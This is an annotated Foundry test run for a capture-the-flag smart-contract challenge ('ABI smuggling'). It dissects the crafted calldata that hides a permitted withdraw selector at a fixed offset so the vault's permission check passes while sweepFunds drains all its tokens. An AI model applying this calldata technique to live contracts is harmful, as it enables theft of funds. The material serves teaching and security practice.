/*
 forge test --match-path ABISmuggling.t.sol -vvvv

╔══════════════════════════════════════════════════════════════════════════════╗
║                     ABI SMUGGLING — TEST RUN ANNOTATION                     ║
║  Both tests pass. Reading the traces top-down shows exactly how the exploit  ║
║  bypasses the permission check and drains the vault in a single call.        ║
╚══════════════════════════════════════════════════════════════════════════════╝

[⠊] Compiling...
[⠒] Compiling 3 files with Solc 0.8.25
[⠢] Solc 0.8.25 finished in 1.03s
Compiler run successful!

Ran 2 tests for test/abi-smuggling/ABISmuggling.t.sol:ABISmugglingChallenge

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 TEST 1 — EXPLOIT  (gas: 54,896)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PASS] test_abiSmuggling() (gas: 54896)
Traces:
  [62496] ABISmugglingChallenge::test_abiSmuggling()
  │
  │  // ── Forge impersonates the player for the entire test body ──────────────
  ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], ...)
  │   └─ ← [Return]
  │
  │  // ── THE EXPLOIT CALL ────────────────────────────────────────────────────
  │  // Raw .call() sends hand-crafted calldata directly to the vault.
  │  // Notice the outer selector shown is "1cff79cd" — that is execute()'s
  │  // 4-byte selector, confirming execute() is the entry point.
  │  //
  │  // Full calldata dissected (each line = 32 bytes unless noted):
  │  //
  │  //  Bytes [0  :4  ]  1cff79cd                           ← execute() selector
  │  //  Bytes [4  :36 ]  0000…1240FA2A84dd9157a0e76B5…      ← target = vault address
  │  //  Bytes [36 :68 ]  0000…0000000000000000000000000080  ← actionData offset = 0x80 (128)
  │  //                    ABI decoder: actionData starts at byte 4+128 = 132
  │  //  Bytes [68 :100]  0000…0000000000000000000000000000  ← filler (32 zero bytes)
  │  //                    ABI decoder ignores this (it precedes the actionData region)
  │  //  Bytes [100:132]  d9caed120000…0000000000000000000   ← *** SMUGGLED SELECTOR ***
  │  //                    execute() reads bytes4 at offset 100 → sees d9caed12 (withdraw)
  │  //                    Permission check: getActionId(d9caed12, player, vault) → PASS ✔
  │  //                    ABI decoder never reads this word → completely ignored
  │  //  Bytes [132:164]  0000…0000000000000000000000000044  ← actionData length = 68 bytes
  │  //  Bytes [164:+68]  85fb709d                           ← sweepFunds() selector
  │  //                   0000…73030B99950fB19C6A813465…     ← arg0: recovery address
  │  //                   0000…8Ad159a275AEE56fb2334DB…      ← arg1: token address
  │  //
  │  // Result: permission check sees withdraw (allowed for player),
  │  //         vault actually executes sweepFunds (not allowed for player).
  ├─ [43218] SelfAuthorizedVault::1cff79cd(
  │            0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264  // target (vault)
  │            0000000000000000000000000000000000000000000000000000000000000080  // offset = 128
  │            0000000000000000000000000000000000000000000000000000000000000000  // filler
  │            d9caed1200000000000000000000000000000000000000000000000000000000  // smuggled selector
  │            0000000000000000000000000000000000000000000000000000000000000044  // length = 68
  │            85fb709d                                                          // sweepFunds selector
  │            00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea  // recovery
  │            0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b  // token
  │          )
  │  │
  │  │  // ── execute() validates then forwards to sweepFunds ─────────────────
  │  │  // At this point:
  │  │  //   • Permission check passed (smuggled d9caed12 matched player's permission)
  │  │  //   • _beforeFunctionCall passed (target == address(this))
  │  │  //   • onlyThis will pass (msg.sender == vault, because execute() calls itself)
  │  │  //   • sweepFunds has no amount cap or time lock → drains everything
  │  ├─ [33733] SelfAuthorizedVault::sweepFunds(
  │  │            recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa],
  │  │            DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
  │  │          )
  │  │  │
  │  │  │  // Step 1: read the vault's current token balance (1,000,000 DVT)
  │  │  ├─ [2516] DamnValuableToken::balanceOf(SelfAuthorizedVault: [...]) [staticcall]
  │  │  │   └─ ← [Return] 1000000000000000000000000 [1e24]   // = 1,000,000 DVT
  │  │  │
  │  │  │  // Step 2: transfer all 1,000,000 DVT to the recovery address in one shot
  │  │  │  // No withdrawal limit (1 ether cap), no 15-day cooldown — sweepFunds has neither.
  │  │  ├─ [27670] DamnValuableToken::transfer(
  │  │  │            recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa],
  │  │  │            1000000000000000000000000 [1e24]          // full balance
  │  │  │          )
  │  │  │  │
  │  │  │  │  // ERC-20 Transfer event confirms the drain was successful
  │  │  │  ├─ emit Transfer(
  │  │  │  │    from:   SelfAuthorizedVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264],
  │  │  │  │    to:     recovery:            [0x73030B99950fB19C6A813465E58A0BcA5487FBEa],
  │  │  │  │    amount: 1000000000000000000000000 [1e24]
  │  │  │  │  )
  │  │  │  └─ ← [Return] true
  │  │  └─ ← [Stop]                // sweepFunds returns (no return value)
  │  │
  │  └─ ← [Return] 0x00…20 00…00  // execute() returns ABI-encoded empty bytes — success
  │
  │  // ── Forge stops impersonating the player ────────────────────────────────
  ├─ [0] VM::stopPrank()
  │   └─ ← [Return]
  │
  │  // ── _isSolved(): assert vault is empty ──────────────────────────────────
  ├─ [516] DamnValuableToken::balanceOf(SelfAuthorizedVault: [...]) [staticcall]
  │   └─ ← [Return] 0              // vault is completely drained ✔
  ├─ [0] VM::assertEq(0, 0, "Vault still has tokens") [staticcall]
  │   └─ ← [Return]
  │
  │  // ── _isSolved(): assert recovery received all tokens ───────────────────
  ├─ [516] DamnValuableToken::balanceOf(recovery: [...]) [staticcall]
  │   └─ ← [Return] 1000000000000000000000000 [1e24]   // all 1,000,000 DVT ✔
  ├─ [0] VM::assertEq(1e24, 1e24, "Not enough tokens in recovery account") [staticcall]
  │   └─ ← [Return]
  │
  └─ ← [Stop]   // test_abiSmuggling PASSED ✔


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 TEST 2 — INITIAL STATE SANITY CHECK  (gas: 32,700)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PASS] test_assertInitialState() (gas: 32700)
Traces:
  [32700] ABISmugglingChallenge::test_assertInitialState()
  │
  │  // ── Confirm vault is initialized ────────────────────────────────────────
  │  // _lastWithdrawalTimestamp is set to block.timestamp in setUp (= 1 in Forge's
  │  // default environment), so assertGt(1, 0) passes.
  ├─ [2325] SelfAuthorizedVault::getLastWithdrawalTimestamp() [staticcall]
  │   └─ ← [Return] 1
  ├─ [0] VM::assertGt(1, 0) [staticcall]
  │   └─ ← [Return]
  │
  │  // setPermissions() was called in setUp, so initialized == true
  ├─ [2299] SelfAuthorizedVault::initialized() [staticcall]
  │   └─ ← [Return] true
  ├─ [0] VM::assertTrue(true) [staticcall]
  │   └─ ← [Return]
  │
  │  // ── Confirm token balances match setUp funding ───────────────────────────
  ├─ [2516] DamnValuableToken::balanceOf(SelfAuthorizedVault: [...]) [staticcall]
  │   └─ ← [Return] 1000000000000000000000000 [1e24]   // vault holds 1,000,000 DVT ✔
  ├─ [0] VM::assertEq(1e24, 1e24) [staticcall]
  │   └─ ← [Return]
  │
  ├─ [2516] DamnValuableToken::balanceOf(player: [...]) [staticcall]
  │   └─ ← [Return] 0              // player starts with nothing ✔
  ├─ [0] VM::assertEq(0, 0) [staticcall]
  │   └─ ← [Return]
  │
  │  // ── Confirm direct calls are blocked by onlyThis ────────────────────────
  │  // Attempt 1: deployer calls sweepFunds directly (no execute() relay)
  │  // Expected revert: CallerNotAllowed — msg.sender is deployer, not address(vault)
  ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 2af07d20…)
  │  //                              ↑ selector of CallerNotAllowed() = 0x2af07d20
  │   └─ ← [Return]
  ├─ [479] SelfAuthorizedVault::sweepFunds(deployer: [...], DamnValuableToken: [...])
  │   └─ ← [Revert] CallerNotAllowed()   // onlyThis fires immediately ✔
  │
  │  // Attempt 2: player calls withdraw directly (no execute() relay)
  │  // Same guard — onlyThis checks msg.sender == address(this), player fails it
  ├─ [0] VM::prank(player: [...])
  │   └─ ← [Return]
  ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 2af07d20…)
  │   └─ ← [Return]
  ├─ [563] SelfAuthorizedVault::withdraw(DamnValuableToken: [...], player: [...], 1e18)
  │   └─ ← [Revert] CallerNotAllowed()   // onlyThis fires immediately ✔
  │
  └─ ← [Stop]   // test_assertInitialState PASSED ✔


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 RESULTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 5.47ms (1.94ms CPU time)
Ran 1 test suite in 11.62ms (5.47ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)

Gas breakdown:
  test_abiSmuggling       54,896 gas total
    └─ sweepFunds relay:  43,218 gas  (includes ERC-20 transfer cold-write: ~27,670)
  test_assertInitialState 32,700 gas total
    └─ two revert probes are cheap (<600 gas each — hit onlyThis before any storage reads)
*/
